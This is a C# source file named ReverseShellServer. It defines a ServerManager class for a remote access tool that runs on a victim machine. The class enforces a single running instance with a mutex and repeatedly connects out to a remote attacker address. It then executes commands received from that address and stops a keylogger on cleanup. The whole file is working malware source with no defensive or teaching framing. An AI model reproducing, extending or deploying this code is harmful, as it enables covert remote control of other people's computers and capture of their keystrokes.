using Commands;
using NetworkManager;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace ReverseShellServer
{
    public class ServerManager
    {
        /// <summary>
        /// Constructor checks if another instance of the application is already running,
        /// if there is one, close itself and let the already started one live
        /// </summary>
        public ServerManager()
        {
            // Only one instance can run, random string identifier
            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Environment.Exit(0);
            }
        }


        /// <summary>
        /// Entry point of the server manager, indefinitely run the server method,
        /// if the connection stops, retry after the given delay
        /// </summary>
        /// <param name="remoteAdress">Remote end to connect to</param>
        /// <param name="remotePort">Remote end's port to connect to</param>
        /// <param name="retryDelay">Time in ms to wait for between each connection attempt</param>
        public void Start(string remoteAdress, int remotePort, int retryDelay)
        {
            while (true)
            {
                RunServer(remoteAdress, remotePort);
                Thread.Sleep(retryDelay);           //Wait for the given time and try again
            }
        }


        /// <summary>
        /// Call the ServerNetworkManager ConnectToClient method, if the connection is succesfull,
        /// start to listen for incoming commands from the client.
        /// </summary>
        /// <param name="remoteAdress">Remote end to connect to</param>
        /// <param name="remotePort">Remote end's port to connect to</param>
        void RunServer(string remoteAdress, int remotePort)
        {
            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
            {
                // the connection attempt wasn't successfull
                return;
            }

            // While there is no exception, wait for incoming data and process it
            while (true)
            {
                try
                {
                    ProcessCommand(GlobalNetworkManager.ReadLine());
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        /// <summary>
        /// Process a string that was already processed by the client sending it, so it's a valid command
        /// </summary>
        /// <param name="receivedData">Data sent by the client</param>
        void ProcessCommand(string receivedData)
        {
            var splittedCommand = receivedData.Split(' ').ToList();
            var commandName = splittedCommand[0];
            var arguments = new List<string>();

            if (splittedCommand.Count > 1)
            {
                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
            }

            var command = CommandsManager.GetCommandByName(commandName);
            if (command != null)
            {
                try
                {
                    command.ServerMethod(arguments);
                }
                catch (StopServerException)
                {
                    StopServer();
                }
            }
        }


        /// <summary>
        /// Close network stream and stop the key listening as well
        /// </summary>
        void Cleanup()
        {
            try
            {
                MainWindow.keyLoggerManager.Stop();
                GlobalNetworkManager.ServerNetworkManager.Cleanup();
            }
            catch (Exception)
            {
                // ignored
            }
        }


        /// <summary>
        /// Exit the program
        /// </summary>
        void StopServer()
        {
            Cleanup();
            Environment.Exit(0);
        }
    }
}
